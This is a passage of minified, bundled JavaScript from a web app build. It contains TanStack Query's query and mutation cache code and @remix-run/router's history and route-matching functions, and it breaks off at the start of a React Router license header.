0:e.promise}setOptions(e){this.options={...U(this,ec),...e},this.updateGcTime(this.options.gcTime)}optionalRemove(){!this.observers.length&&this.state.fetchStatus==="idle"&&U(this,cn).remove(this)}setData(e,n){const r=xO(this.state.data,e,this.options);return yt(this,bn,mr).call(this,{data:r,type:"success",dataUpdatedAt:n==null?void 0:n.updatedAt,manual:n==null?void 0:n.manual}),r}setState(e,n){yt(this,bn,mr).call(this,{type:"setState",state:e,setStateOptions:n})}cancel(e){var r,i;const n=(r=U(this,xt))==null?void 0:r.promise;return(i=U(this,xt))==null||i.cancel(e),n?n.then(Sn).catch(Sn):Promise.resolve()}destroy(){super.destroy(),this.cancel({silent:!0})}reset(){this.destroy(),this.setState(U(this,bo))}isActive(){return this.observers.some(e=>_O(e.options.enabled,this)!==!1)}isDisabled(){return this.getObserversCount()>0?!this.isActive():this.options.queryFn===xv||this.state.dataUpdateCount+this.state.errorUpdateCount===0}isStale(){return this.state.isInvalidated?!0:this.getObserversCount()>0?this.observers.some(e=>e.getCurrentResult().isStale):this.state.data===void 0}isStaleByTime(e=0){return this.state.isInvalidated||this.state.data===void 0||!yO(this.state.dataUpdatedAt,e)}onFocus(){var n;const e=this.observers.find(r=>r.shouldFetchOnWindowFocus());e==null||e.refetch({cancelRefetch:!1}),(n=U(this,xt))==null||n.continue()}onOnline(){var n;const e=this.observers.find(r=>r.shouldFetchOnReconnect());e==null||e.refetch({cancelRefetch:!1}),(n=U(this,xt))==null||n.continue()}addObserver(e){this.observers.includes(e)||(this.observers.push(e),this.clearGcTimeout(),U(this,cn).notify({type:"observerAdded",query:this,observer:e}))}removeObserver(e){this.observers.includes(e)&&(this.observers=this.observers.filter(n=>n!==e),this.observers.length||(U(this,xt)&&(U(this,ms)?U(this,xt).cancel({revert:!0}):U(this,xt).cancelRetry()),this.scheduleGc()),U(this,cn).notify({type:"observerRemoved",query:this,observer:e}))}getObserversCount(){return this.observers.length}invalidate(){this.state.isInvalidated||yt(this,bn,mr).call(this,{type:"invalidate"})}fetch(e,n){var c,u,p;if(this.state.fetchStatus!=="idle"){if(this.state.data!==void 0&&(n!=null&&n.cancelRefetch))this.cancel({silent:!0});else if(U(this,xt))return U(this,xt).continueRetry(),U(this,xt).promise}if(e&&this.setOptions(e),!this.options.queryFn){const f=this.observers.find(h=>h.options.queryFn);f&&this.setOptions(f.options)}const r=new AbortController,i=f=>{Object.defineProperty(f,"signal",{enumerable:!0,get:()=>(se(this,ms,!0),r.signal)})},s=()=>{const f=E1(this.options,n),h={queryKey:this.queryKey,meta:this.meta};return i(h),se(this,ms,!1),this.options.persister?this.options.persister(f,h,this):f(h)},o={fetchOptions:n,options:this.options,queryKey:this.queryKey,state:this.state,fetchFn:s};i(o),(c=this.options.behavior)==null||c.onFetch(o,this),se(this,To,this.state),(this.state.fetchStatus==="idle"||this.state.fetchMeta!==((u=o.fetchOptions)==null?void 0:u.meta))&&yt(this,bn,mr).call(this,{type:"fetch",meta:(p=o.fetchOptions)==null?void 0:p.meta});const a=f=>{var h,E,_,y;Xf(f)&&f.silent||yt(this,bn,mr).call(this,{type:"error",error:f}),Xf(f)||((E=(h=U(this,cn).config).onError)==null||E.call(h,f,this),(y=(_=U(this,cn).config).onSettled)==null||y.call(_,this.state.data,f,this)),this.scheduleGc()};return se(this,xt,T1({initialPromise:n==null?void 0:n.initialPromise,fn:o.fetchFn,abort:r.abort.bind(r),onSuccess:f=>{var h,E,_,y;if(f===void 0){a(new Error(`${this.queryHash} data is undefined`));return}try{this.setData(f)}catch(C){a(C);return}(E=(h=U(this,cn).config).onSuccess)==null||E.call(h,f,this),(y=(_=U(this,cn).config).onSettled)==null||y.call(_,f,this.state.error,this),this.scheduleGc()},onError:a,onFail:(f,h)=>{yt(this,bn,mr).call(this,{type:"failed",failureCount:f,error:h})},onPause:()=>{yt(this,bn,mr).call(this,{type:"pause"})},onContinue:()=>{yt(this,bn,mr).call(this,{type:"continue"})},retry:o.options.retry,retryDelay:o.options.retryDelay,networkMode:o.options.networkMode,canRun:()=>!0})),U(this,xt).start()}},bo=new WeakMap,To=new WeakMap,cn=new WeakMap,xt=new WeakMap,ec=new WeakMap,ms=new WeakMap,bn=new WeakSet,mr=function(e){const n=r=>{switch(e.type){case"failed":return{...r,fetchFailureCount:e.failureCount,fetchFailureReason:e.error};case"pause":return{...r,fetchStatus:"paused"};case"continue":return{...r,fetchStatus:"fetching"};case"fetch":return{...r,...PO(r.data,this.options),fetchMeta:e.meta??null};case"success":return{...r,data:e.data,dataUpdateCount:r.dataUpdateCount+1,dataUpdatedAt:e.dataUpdatedAt??Date.now(),error:null,isInvalidated:!1,status:"success",...!e.manual&&{fetchStatus:"idle",fetchFailureCount:0,fetchFailureReason:null}};case"error":const i=e.error;return Xf(i)&&i.revert&&U(this,To)?{...U(this,To),fetchStatus:"idle"}:{...r,error:i,errorUpdateCount:r.errorUpdateCount+1,errorUpdatedAt:Date.now(),fetchFailureCount:r.fetchFailureCount+1,fetchFailureReason:i,fetchStatus:"idle",status:"error"};case"invalidate":return{...r,isInvalidated:!0};case"setState":return{...r,...e.state}}};this.state=n(this.state),kt.batch(()=>{this.observers.forEach(r=>{r.onQueryUpdate()}),U(this,cn).notify({query:this,type:"updated",action:e})})},hE);function PO(t,e){return{fetchFailureCount:0,fetchFailureReason:null,fetchStatus:S1(e.networkMode)?"fetching":"paused",...t===void 0&&{error:null,status:"pending"}}}function RO(t){const e=typeof t.initialData=="function"?t.initialData():t.initialData,n=e!==void 0,r=n?typeof t.initialDataUpdatedAt=="function"?t.initialDataUpdatedAt():t.initialDataUpdatedAt:0;return{data:e,dataUpdateCount:0,dataUpdatedAt:n?r??Date.now():0,error:null,errorUpdateCount:0,errorUpdatedAt:0,fetchFailureCount:0,fetchFailureReason:null,fetchMeta:null,isInvalidated:!1,status:n?"success":"pending",fetchStatus:"idle"}}var qn,fE,AO=(fE=class extends wh{constructor(e={}){super();we(this,qn);this.config=e,se(this,qn,new Map)}build(e,n,r){const i=n.queryKey,s=n.queryHash??wv(i,n);let o=this.get(s);return o||(o=new kO({cache:this,queryKey:i,queryHash:s,options:e.defaultQueryOptions(n),state:r,defaultOptions:e.getQueryDefaults(i)}),this.add(o)),o}add(e){U(this,qn).has(e.queryHash)||(U(this,qn).set(e.queryHash,e),this.notify({type:"added",query:e}))}remove(e){const n=U(this,qn).get(e.queryHash);n&&(e.destroy(),n===e&&U(this,qn).delete(e.queryHash),this.notify({type:"removed",query:e}))}clear(){kt.batch(()=>{this.getAll().forEach(e=>{this.remove(e)})})}get(e){return U(this,qn).get(e)}getAll(){return[...U(this,qn).values()]}find(e){const n={exact:!0,...e};return this.getAll().find(r=>nw(n,r))}findAll(e={}){const n=this.getAll();return Object.keys(e).length>0?n.filter(r=>nw(e,r)):n}notify(e){kt.batch(()=>{this.listeners.forEach(n=>{n(e)})})}onFocus(){kt.batch(()=>{this.getAll().forEach(e=>{e.onFocus()})})}onOnline(){kt.batch(()=>{this.getAll().forEach(e=>{e.onOnline()})})}},qn=new WeakMap,fE),Yn,Tt,gs,Qn,Xr,pE,OO=(pE=class extends I1{constructor(e){super();we(this,Qn);we(this,Yn);we(this,Tt);we(this,gs);this.mutationId=e.mutationId,se(this,Tt,e.mutationCache),se(this,Yn,[]),this.state=e.state||DO(),this.setOptions(e.options),this.scheduleGc()}setOptions(e){this.options=e,this.updateGcTime(this.options.gcTime)}get meta(){return this.options.meta}addObserver(e){U(this,Yn).includes(e)||(U(this,Yn).push(e),this.clearGcTimeout(),U(this,Tt).notify({type:"observerAdded",mutation:this,observer:e}))}removeObserver(e){se(this,Yn,U(this,Yn).filter(n=>n!==e)),this.scheduleGc(),U(this,Tt).notify({type:"observerRemoved",mutation:this,observer:e})}optionalRemove(){U(this,Yn).length||(this.state.status==="pending"?this.scheduleGc():U(this,Tt).remove(this))}continue(){var e;return((e=U(this,gs))==null?void 0:e.continue())??this.execute(this.state.variables)}async execute(e){var i,s,o,a,c,u,p,f,h,E,_,y,C,x,w,S,N,R,j,T;se(this,gs,T1({fn:()=>this.options.mutationFn?this.options.mutationFn(e):Promise.reject(new Error("No mutationFn found")),onFail:(b,P)=>{yt(this,Qn,Xr).call(this,{type:"failed",failureCount:b,error:P})},onPause:()=>{yt(this,Qn,Xr).call(this,{type:"pause"})},onContinue:()=>{yt(this,Qn,Xr).call(this,{type:"continue"})},retry:this.options.retry??0,retryDelay:this.options.retryDelay,networkMode:this.options.networkMode,canRun:()=>U(this,Tt).canRun(this)}));const n=this.state.status==="pending",r=!U(this,gs).canStart();try{if(!n){yt(this,Qn,Xr).call(this,{type:"pending",variables:e,isPaused:r}),await((s=(i=U(this,Tt).config).onMutate)==null?void 0:s.call(i,e,this));const P=await((a=(o=this.options).onMutate)==null?void 0:a.call(o,e));P!==this.state.context&&yt(this,Qn,Xr).call(this,{type:"pending",context:P,variables:e,isPaused:r})}const b=await U(this,gs).start();return await((u=(c=U(this,Tt).config).onSuccess)==null?void 0:u.call(c,b,e,this.state.context,this)),await((f=(p=this.options).onSuccess)==null?void 0:f.call(p,b,e,this.state.context)),await((E=(h=U(this,Tt).config).onSettled)==null?void 0:E.call(h,b,null,this.state.variables,this.state.context,this)),await((y=(_=this.options).onSettled)==null?void 0:y.call(_,b,null,e,this.state.context)),yt(this,Qn,Xr).call(this,{type:"success",data:b}),b}catch(b){try{throw await((x=(C=U(this,Tt).config).onError)==null?void 0:x.call(C,b,e,this.state.context,this)),await((S=(w=this.options).onError)==null?void 0:S.call(w,b,e,this.state.context)),await((R=(N=U(this,Tt).config).onSettled)==null?void 0:R.call(N,void 0,b,this.state.variables,this.state.context,this)),await((T=(j=this.options).onSettled)==null?void 0:T.call(j,void 0,b,e,this.state.context)),b}finally{yt(this,Qn,Xr).call(this,{type:"error",error:b})}}finally{U(this,Tt).runNext(this)}}},Yn=new WeakMap,Tt=new WeakMap,gs=new WeakMap,Qn=new WeakSet,Xr=function(e){const n=r=>{switch(e.type){case"failed":return{...r,failureCount:e.failureCount,failureReason:e.error};case"pause":return{...r,isPaused:!0};case"continue":return{...r,isPaused:!1};case"pending":return{...r,context:e.context,data:void 0,failureCount:0,failureReason:null,error:null,isPaused:e.isPaused,status:"pending",variables:e.variables,submittedAt:Date.now()};case"success":return{...r,data:e.data,failureCount:0,failureReason:null,error:null,status:"success",isPaused:!1};case"error":return{...r,data:void 0,error:e.error,failureCount:r.failureCount+1,failureReason:e.error,isPaused:!1,status:"error"}}};this.state=n(this.state),kt.batch(()=>{U(this,Yn).forEach(r=>{r.onMutationUpdate(e)}),U(this,Tt).notify({mutation:this,type:"updated",action:e})})},pE);function DO(){return{context:void 0,data:void 0,error:null,failureCount:0,failureReason:null,isPaused:!1,status:"idle",variables:void 0,submittedAt:0}}var qt,tc,mE,jO=(mE=class extends wh{constructor(e={}){super();we(this,qt);we(this,tc);this.config=e,se(this,qt,new Map),se(this,tc,Date.now())}build(e,n,r){const i=new OO({mutationCache:this,mutationId:++Bc(this,tc)._,options:e.defaultMutationOptions(n),state:r});return this.add(i),i}add(e){const n=cu(e),r=U(this,qt).get(n)??[];r.push(e),U(this,qt).set(n,r),this.notify({type:"added",mutation:e})}remove(e){var r;const n=cu(e);if(U(this,qt).has(n)){const i=(r=U(this,qt).get(n))==null?void 0:r.filter(s=>s!==e);i&&(i.length===0?U(this,qt).delete(n):U(this,qt).set(n,i))}this.notify({type:"removed",mutation:e})}canRun(e){var r;const n=(r=U(this,qt).get(cu(e)))==null?void 0:r.find(i=>i.state.status==="pending");return!n||n===e}runNext(e){var r;const n=(r=U(this,qt).get(cu(e)))==null?void 0:r.find(i=>i!==e&&i.state.isPaused);return(n==null?void 0:n.continue())??Promise.resolve()}clear(){kt.batch(()=>{this.getAll().forEach(e=>{this.remove(e)})})}getAll(){return[...U(this,qt).values()].flat()}find(e){const n={exact:!0,...e};return this.getAll().find(r=>rw(n,r))}findAll(e={}){return this.getAll().filter(n=>rw(e,n))}notify(e){kt.batch(()=>{this.listeners.forEach(n=>{n(e)})})}resumePausedMutations(){const e=this.getAll().filter(n=>n.state.isPaused);return kt.batch(()=>Promise.all(e.map(n=>n.continue().catch(Sn))))}},qt=new WeakMap,tc=new WeakMap,mE);function cu(t){var e;return((e=t.options.scope)==null?void 0:e.id)??String(t.mutationId)}function ow(t){return{onFetch:(e,n)=>{var p,f,h,E,_;const r=e.options,i=(h=(f=(p=e.fetchOptions)==null?void 0:p.meta)==null?void 0:f.fetchMore)==null?void 0:h.direction,s=((E=e.state.data)==null?void 0:E.pages)||[],o=((_=e.state.data)==null?void 0:_.pageParams)||[];let a={pages:[],pageParams:[]},c=0;const u=async()=>{let y=!1;const C=S=>{Object.defineProperty(S,"signal",{enumerable:!0,get:()=>(e.signal.aborted?y=!0:e.signal.addEventListener("abort",()=>{y=!0}),e.signal)})},x=E1(e.options,e.fetchOptions),w=async(S,N,R)=>{if(y)return Promise.reject();if(N==null&&S.pages.length)return Promise.resolve(S);const j={queryKey:e.queryKey,pageParam:N,direction:R?"backward":"forward",meta:e.options.meta};C(j);const T=await x(j),{maxPages:b}=e.options,P=R?CO:EO;return{pages:P(S.pages,T,b),pageParams:P(S.pageParams,N,b)}};if(i&&s.length){const S=i==="backward",N=S?MO:aw,R={pages:s,pageParams:o},j=N(r,R);a=await w(R,j,S)}else{const S=t??s.length;do{const N=c===0?o[0]??r.initialPageParam:aw(r,a);if(c>0&&N==null)break;a=await w(a,N),c++}while(c<S)}return a};e.options.persister?e.fetchFn=()=>{var y,C;return(C=(y=e.options).persister)==null?void 0:C.call(y,u,{queryKey:e.queryKey,meta:e.options.meta,signal:e.signal},n)}:e.fetchFn=u}}}function aw(t,{pages:e,pageParams:n}){const r=e.length-1;return e.length>0?t.getNextPageParam(e[r],e,n[r],n):void 0}function MO(t,{pages:e,pageParams:n}){var r;return e.length>0?(r=t.getPreviousPageParam)==null?void 0:r.call(t,e[0],e,n[0],n):void 0}var ze,ci,ui,Io,No,di,ko,Po,gE,LO=(gE=class{constructor(t={}){we(this,ze);we(this,ci);we(this,ui);we(this,Io);we(this,No);we(this,di);we(this,ko);we(this,Po);se(this,ze,t.queryCache||new AO),se(this,ci,t.mutationCache||new jO),se(this,ui,t.defaultOptions||{}),se(this,Io,new Map),se(this,No,new Map),se(this,di,0)}mount(){Bc(this,di)._++,U(this,di)===1&&(se(this,ko,C1.subscribe(async t=>{t&&(await this.resumePausedMutations(),U(this,ze).onFocus())})),se(this,Po,_d.subscribe(async t=>{t&&(await this.resumePausedMutations(),U(this,ze).onOnline())})))}unmount(){var t,e;Bc(this,di)._--,U(this,di)===0&&((t=U(this,ko))==null||t.call(this),se(this,ko,void 0),(e=U(this,Po))==null||e.call(this),se(this,Po,void 0))}isFetching(t){return U(this,ze).findAll({...t,fetchStatus:"fetching"}).length}isMutating(t){return U(this,ci).findAll({...t,status:"pending"}).length}getQueryData(t){var n;const e=this.defaultQueryOptions({queryKey:t});return(n=U(this,ze).get(e.queryHash))==null?void 0:n.state.data}ensureQueryData(t){const e=this.getQueryData(t.queryKey);if(e===void 0)return this.fetchQuery(t);{const n=this.defaultQueryOptions(t),r=U(this,ze).build(this,n);return t.revalidateIfStale&&r.isStaleByTime(tw(n.staleTime,r))&&this.prefetchQuery(n),Promise.resolve(e)}}getQueriesData(t){return U(this,ze).findAll(t).map(({queryKey:e,state:n})=>{const r=n.data;return[e,r]})}setQueryData(t,e,n){const r=this.defaultQueryOptions({queryKey:t}),i=U(this,ze).get(r.queryHash),s=i==null?void 0:i.state.data,o=gO(e,s);if(o!==void 0)return U(this,ze).build(this,r).setData(o,{...n,manual:!0})}setQueriesData(t,e,n){return kt.batch(()=>U(this,ze).findAll(t).map(({queryKey:r})=>[r,this.setQueryData(r,e,n)]))}getQueryState(t){var n;const e=this.defaultQueryOptions({queryKey:t});return(n=U(this,ze).get(e.queryHash))==null?void 0:n.state}removeQueries(t){const e=U(this,ze);kt.batch(()=>{e.findAll(t).forEach(n=>{e.remove(n)})})}resetQueries(t,e){const n=U(this,ze),r={type:"active",...t};return kt.batch(()=>(n.findAll(t).forEach(i=>{i.reset()}),this.refetchQueries(r,e)))}cancelQueries(t={},e={}){const n={revert:!0,...e},r=kt.batch(()=>U(this,ze).findAll(t).map(i=>i.cancel(n)));return Promise.all(r).then(Sn).catch(Sn)}invalidateQueries(t={},e={}){return kt.batch(()=>{if(U(this,ze).findAll(t).forEach(r=>{r.invalidate()}),t.refetchType==="none")return Promise.resolve();const n={...t,type:t.refetchType??t.type??"active"};return this.refetchQueries(n,e)})}refetchQueries(t={},e){const n={...e,cancelRefetch:(e==null?void 0:e.cancelRefetch)??!0},r=kt.batch(()=>U(this,ze).findAll(t).filter(i=>!i.isDisabled()).map(i=>{let s=i.fetch(void 0,n);return n.throwOnError||(s=s.catch(Sn)),i.state.fetchStatus==="paused"?Promise.resolve():s}));return Promise.all(r).then(Sn)}fetchQuery(t){const e=this.defaultQueryOptions(t);e.retry===void 0&&(e.retry=!1);const n=U(this,ze).build(this,e);return n.isStaleByTime(tw(e.staleTime,n))?n.fetch(e):Promise.resolve(n.state.data)}prefetchQuery(t){return this.fetchQuery(t).then(Sn).catch(Sn)}fetchInfiniteQuery(t){return t.behavior=ow(t.pages),this.fetchQuery(t)}prefetchInfiniteQuery(t){return this.fetchInfiniteQuery(t).then(Sn).catch(Sn)}ensureInfiniteQueryData(t){return t.behavior=ow(t.pages),this.ensureQueryData(t)}resumePausedMutations(){return _d.isOnline()?U(this,ci).resumePausedMutations():Promise.resolve()}getQueryCache(){return U(this,ze)}getMutationCache(){return U(this,ci)}getDefaultOptions(){return U(this,ui)}setDefaultOptions(t){se(this,ui,t)}setQueryDefaults(t,e){U(this,Io).set(jl(t),{queryKey:t,defaultOptions:e})}getQueryDefaults(t){const e=[...U(this,Io).values()];let n={};return e.forEach(r=>{Ml(t,r.queryKey)&&(n={...n,...r.defaultOptions})}),n}setMutationDefaults(t,e){U(this,No).set(jl(t),{mutationKey:t,defaultOptions:e})}getMutationDefaults(t){const e=[...U(this,No).values()];let n={};return e.forEach(r=>{Ml(t,r.mutationKey)&&(n={...n,...r.defaultOptions})}),n}defaultQueryOptions(t){if(t._defaulted)return t;const e={...U(this,ui).queries,...this.getQueryDefaults(t.queryKey),...t,_defaulted:!0};return e.queryHash||(e.queryHash=wv(e.queryKey,e)),e.refetchOnReconnect===void 0&&(e.refetchOnReconnect=e.networkMode!=="always"),e.throwOnError===void 0&&(e.throwOnError=!!e.suspense),!e.networkMode&&e.persister&&(e.networkMode="offlineFirst"),e.enabled!==!0&&e.queryFn===xv&&(e.enabled=!1),e}defaultMutationOptions(t){return t!=null&&t._defaulted?t:{...U(this,ui).mutations,...(t==null?void 0:t.mutationKey)&&this.getMutationDefaults(t.mutationKey),...t,_defaulted:!0}}clear(){U(this,ze).clear(),U(this,ci).clear()}},ze=new WeakMap,ci=new WeakMap,ui=new WeakMap,Io=new WeakMap,No=new WeakMap,di=new WeakMap,ko=new WeakMap,Po=new WeakMap,gE),FO=v.createContext(void 0),UO=({client:t,children:e})=>(v.useEffect(()=>(t.mount(),()=>{t.unmount()}),[t]),d.jsx(FO.Provider,{value:t,children:e}));/**
 * @remix-run/router v1.20.0
 *
 * Copyright (c) Remix Software Inc.
 *
 * This source code is licensed under the MIT license found in the
 * LICENSE.md file in the root directory of this source tree.
 *
 * @license MIT
 */function Ll(){return Ll=Object.assign?Object.assign.bind():function(t){for(var e=1;e<arguments.length;e++){var n=arguments[e];for(var r in n)Object.prototype.hasOwnProperty.call(n,r)&&(t[r]=n[r])}return t},Ll.apply(this,arguments)}var pi;(function(t){t.Pop="POP",t.Push="PUSH",t.Replace="REPLACE"})(pi||(pi={}));const lw="popstate";function $O(t){t===void 0&&(t={});function e(r,i){let{pathname:s,search:o,hash:a}=r.location;return Nm("",{pathname:s,search:o,hash:a},i.state&&i.state.usr||null,i.state&&i.state.key||"default")}function n(r,i){return typeof i=="string"?i:wd(i)}return BO(e,n,null,t)}function Xe(t,e){if(t===!1||t===null||typeof t>"u")throw new Error(e)}function N1(t,e){if(!t){typeof console<"u"&&console.warn(e);try{throw new Error(e)}catch{}}}function zO(){return Math.random().toString(36).substr(2,8)}function cw(t,e){return{usr:t.state,key:t.key,idx:e}}function Nm(t,e,n,r){return n===void 0&&(n=null),Ll({pathname:typeof t=="string"?t:t.pathname,search:"",hash:""},typeof e=="string"?ea(e):e,{state:n,key:e&&e.key||r||zO()})}function wd(t){let{pathname:e="/",search:n="",hash:r=""}=t;return n&&n!=="?"&&(e+=n.charAt(0)==="?"?n:"?"+n),r&&r!=="#"&&(e+=r.charAt(0)==="#"?r:"#"+r),e}function ea(t){let e={};if(t){let n=t.indexOf("#");n>=0&&(e.hash=t.substr(n),t=t.substr(0,n));let r=t.indexOf("?");r>=0&&(e.search=t.substr(r),t=t.substr(0,r)),t&&(e.pathname=t)}return e}function BO(t,e,n,r){r===void 0&&(r={});let{window:i=document.defaultView,v5Compat:s=!1}=r,o=i.history,a=pi.Pop,c=null,u=p();u==null&&(u=0,o.replaceState(Ll({},o.state,{idx:u}),""));function p(){return(o.state||{idx:null}).idx}function f(){a=pi.Pop;let C=p(),x=C==null?null:C-u;u=C,c&&c({action:a,location:y.location,delta:x})}function h(C,x){a=pi.Push;let w=Nm(y.location,C,x);u=p()+1;let S=cw(w,u),N=y.createHref(w);try{o.pushState(S,"",N)}catch(R){if(R instanceof DOMException&&R.name==="DataCloneError")throw R;i.location.assign(N)}s&&c&&c({action:a,location:y.location,delta:1})}function E(C,x){a=pi.Replace;let w=Nm(y.location,C,x);u=p();let S=cw(w,u),N=y.createHref(w);o.replaceState(S,"",N),s&&c&&c({action:a,location:y.location,delta:0})}function _(C){let x=i.location.origin!=="null"?i.location.origin:i.location.href,w=typeof C=="string"?C:wd(C);return w=w.replace(/ $/,"%20"),Xe(x,"No window.location.(origin|href) available to create URL for href: "+w),new URL(w,x)}let y={get action(){return a},get location(){return t(i,o)},listen(C){if(c)throw new Error("A history only accepts one active listener");return i.addEventListener(lw,f),c=C,()=>{i.removeEventListener(lw,f),c=null}},createHref(C){return e(i,C)},createURL:_,encodeLocation(C){let x=_(C);return{pathname:x.pathname,search:x.search,hash:x.hash}},push:h,replace:E,go(C){return o.go(C)}};return y}var uw;(function(t){t.data="data",t.deferred="deferred",t.redirect="redirect",t.error="error"})(uw||(uw={}));function VO(t,e,n){return n===void 0&&(n="/"),HO(t,e,n,!1)}function HO(t,e,n,r){let i=typeof e=="string"?ea(e):e,s=Ev(i.pathname||"/",n);if(s==null)return null;let o=k1(t);WO(o);let a=null;for(let c=0;a==null&&c<o.length;++c){let u=nD(s);a=eD(o[c],u,r)}return a}function k1(t,e,n,r){e===void 0&&(e=[]),n===void 0&&(n=[]),r===void 0&&(r="");let i=(s,o,a)=>{let c={relativePath:a===void 0?s.path||"":a,caseSensitive:s.caseSensitive===!0,childrenIndex:o,route:s};c.relativePath.startsWith("/")&&(Xe(c.relativePath.startsWith(r),'Absolute route path "'+c.relativePath+'" nested under path '+('"'+r+'" is not valid. An absolute child route path ')+"must start with the combined path of all its parent routes."),c.relativePath=c.relativePath.slice(r.length));let u=Si([r,c.relativePath]),p=n.concat(c);s.children&&s.children.length>0&&(Xe(s.index!==!0,"Index routes must not have child routes. Please remove "+('all child routes from route path "'+u+'".')),k1(s.children,e,p,u)),!(s.path==null&&!s.index)&&e.push({path:u,score:JO(u,s.index),routesMeta:p})};return t.forEach((s,o)=>{var a;if(s.path===""||!((a=s.path)!=null&&a.includes("?")))i(s,o);else for(let c of P1(s.path))i(s,o,c)}),e}function P1(t){let e=t.split("/");if(e.length===0)return[];let[n,...r]=e,i=n.endsWith("?"),s=n.replace(/\?$/,"");if(r.length===0)return i?[s,""]:[s];let o=P1(r.join("/")),a=[];return a.push(...o.map(c=>c===""?s:[s,c].join("/"))),i&&a.push(...o),a.map(c=>t.startsWith("/")&&c===""?"/":c)}function WO(t){t.sort((e,n)=>e.score!==n.score?n.score-e.score:ZO(e.routesMeta.map(r=>r.childrenIndex),n.routesMeta.map(r=>r.childrenIndex)))}const KO=/^:[\w-]+$/,GO=3,qO=2,YO=1,QO=10,XO=-2,dw=t=>t==="*";function JO(t,e){let n=t.split("/"),r=n.length;return n.some(dw)&&(r+=XO),e&&(r+=qO),n.filter(i=>!dw(i)).reduce((i,s)=>i+(KO.test(s)?GO:s===""?YO:QO),r)}function ZO(t,e){return t.length===e.length&&t.slice(0,-1).every((r,i)=>r===e[i])?t[t.length-1]-e[e.length-1]:0}function eD(t,e,n){let{routesMeta:r}=t,i={},s="/",o=[];for(let a=0;a<r.length;++a){let c=r[a],u=a===r.length-1,p=s==="/"?e:e.slice(s.length)||"/",f=hw({path:c.relativePath,caseSensitive:c.caseSensitive,end:u},p),h=c.route;if(!f&&u&&n&&!r[r.length-1].route.index&&(f=hw({path:c.relativePath,caseSensitive:c.caseSensitive,end:!1},p)),!f)return null;Object.assign(i,f.params),o.push({params:i,pathname:Si([s,f.pathname]),pathnameBase:oD(Si([s,f.pathnameBase])),route:h}),f.pathnameBase!=="/"&&(s=Si([s,f.pathnameBase]))}return o}function hw(t,e){typeof t=="string"&&(t={path:t,caseSensitive:!1,end:!0});let[n,r]=tD(t.path,t.caseSensitive,t.end),i=e.match(n);if(!i)return null;let s=i[0],o=s.replace(/(.)\/+$/,"$1"),a=i.slice(1);return{params:r.reduce((u,p,f)=>{let{paramName:h,isOptional:E}=p;if(h==="*"){let y=a[f]||"";o=s.slice(0,s.length-y.length).replace(/(.)\/+$/,"$1")}const _=a[f];return E&&!_?u[h]=void 0:u[h]=(_||"").replace(/%2F/g,"/"),u},{}),pathname:s,pathnameBase:o,pattern:t}}function tD(t,e,n){e===void 0&&(e=!1),n===void 0&&(n=!0),N1(t==="*"||!t.endsWith("*")||t.endsWith("/*"),'Route path "'+t+'" will be treated as if it were '+('"'+t.replace(/\*$/,"/*")+'" because the `*` character must ')+"always follow a `/` in the pattern. To get rid of this warning, "+('please change the route path to "'+t.replace(/\*$/,"/*")+'".'));let r=[],i="^"+t.replace(/\/*\*?$/,"").replace(/^\/*/,"/").replace(/[\\.*+^${}|()[\]]/g,"\\$&").replace(/\/:([\w-]+)(\?)?/g,(o,a,c)=>(r.push({paramName:a,isOptional:c!=null}),c?"/?([^\\/]+)?":"/([^\\/]+)"));return t.endsWith("*")?(r.push({paramName:"*"}),i+=t==="*"||t==="/*"?"(.*)$":"(?:\\/(.+)|\\/*)$"):n?i+="\\/*$":t!==""&&t!=="/"&&(i+="(?:(?=\\/|$))"),[new RegExp(i,e?void 0:"i"),r]}function nD(t){try{return t.split("/").map(e=>decodeURIComponent(e).replace(/\//g,"%2F")).join("/")}catch(e){return N1(!1,'The URL path "'+t+'" could not be decoded because it is is a malformed URL segment. This is probably due to a bad percent '+("encoding ("+e+").")),t}}function Ev(t,e){if(e==="/")return t;if(!t.toLowerCase().startsWith(e.toLowerCase()))return null;let n=e.endsWith("/")?e.length-1:e.length,r=t.charAt(n);return r&&r!=="/"?null:t.slice(n)||"/"}function rD(t,e){e===void 0&&(e="/");let{pathname:n,search:r="",hash:i=""}=typeof t=="string"?ea(t):t;return{pathname:n?n.startsWith("/")?n:iD(n,e):e,search:aD(r),hash:lD(i)}}function iD(t,e){let n=e.replace(/\/+$/,"").split("/");return t.split("/").forEach(i=>{i===".."?n.length>1&&n.pop():i!=="."&&n.push(i)}),n.length>1?n.join("/"):"/"}function Jf(t,e,n,r){return"Cannot include a '"+t+"' character in a manually specified "+("`to."+e+"` field ["+JSON.stringify(r)+"].  Please separate it out to the ")+("`to."+n+"` field. Alternatively you may provide the full path as ")+'a string in <Link to="..."> and the router will parse it for you.'}function sD(t){return t.filter((e,n)=>n===0||e.route.path&&e.route.path.length>0)}function R1(t,e){let n=sD(t);return e?n.map((r,i)=>i===n.length-1?r.pathname:r.pathnameBase):n.map(r=>r.pathnameBase)}function A1(t,e,n,r){r===void 0&&(r=!1);let i;typeof t=="string"?i=ea(t):(i=Ll({},t),Xe(!i.pathname||!i.pathname.includes("?"),Jf("?","pathname","search",i)),Xe(!i.pathname||!i.pathname.includes("#"),Jf("#","pathname","hash",i)),Xe(!i.search||!i.search.includes("#"),Jf("#","search","hash",i)));let s=t===""||i.pathname==="",o=s?"/":i.pathname,a;if(o==null)a=n;else{let f=e.length-1;if(!r&&o.startsWith("..")){let h=o.split("/");for(;h[0]==="..";)h.shift(),f-=1;i.pathname=h.join("/")}a=f>=0?e[f]:"/"}let c=rD(i,a),u=o&&o!=="/"&&o.endsWith("/"),p=(s||o===".")&&n.endsWith("/");return!c.pathname.endsWith("/")&&(u||p)&&(c.pathname+="/"),c}const Si=t=>t.join("/").replace(/\/\/+/g,"/"),oD=t=>t.replace(/\/+$/,"").replace(/^\/*/,"/"),aD=t=>!t||t==="?"?"":t.startsWith("?")?t:"?"+t,lD=t=>!t||t==="#"?"":t.startsWith("#")?t:"#"+t;function cD(t){return t!=null&&typeof t.status=="number"&&typeof t.statusText=="string"&&typeof t.internal=="boolean"&&"data"in t}const O1=["post","put","patch","delete"];new Set(O1);const uD=["get",...O1];new Set(uD);/**
 * React Router v6.27.0
 *
 * Copyright (c) Remix Software Inc.
 *
 * This source code is licensed under the MIT license found in the
 * LICENSE.md file in the root directory of this source tree.
 *
 * @license MIT
